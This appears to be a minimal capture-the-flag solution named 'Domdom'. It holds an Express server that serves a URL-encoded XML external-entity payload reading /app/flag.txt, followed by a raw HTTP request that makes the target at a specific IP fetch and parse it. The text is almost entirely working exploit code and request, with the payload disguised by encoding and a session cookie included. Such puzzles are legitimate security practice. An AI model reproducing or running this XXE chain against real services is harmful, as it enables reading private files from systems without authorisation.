# Domdom

Server: server_content.js

```
const express = require('express');
const app = express();

// Middleware to log each request
app.use((req, res, next) => {
    const now = new Date().toISOString();
    console.log(`${now} - ${req.method} request to ${req.url}`);
    next();  // Pass control to the next handler
});

// Route to return a JSON object
app.get('/get-json', (req, res) => {
    // URL-encoded string
    const encodedComment = "%3c%21%44%4f%43%54%59%50%45%20%64%20%5b%3c%21%45%4e%54%49%54%59%20%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%61%70%70%2f%66%6c%61%67%2e%74%78%74%22%3e%5d%3e%3c%74%3e%26%65%3b%3c%2f%74%3e"
    // Decode the URL-encoded string
    const decodedComment = decodeURIComponent(encodedComment);
    // Construct the JSON object
    const data = {
        "Comment": decodedComment,          // Original encoded string
    };

    // Return the JSON object
    res.json(data);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

```

Request

```
POST /check HTTP/1.1
Host: 165.154.162.112:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSrmpxcWJ6alKOkp--QrFqTmpySWpKQppmTmpSrG1OkSpiq0FAErYHiI.Zu8lIw.ZSSS4NVC8C_YhJAAJ-iPCZZFv30
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

url=http://165.154.162.112:3000/get-json
```

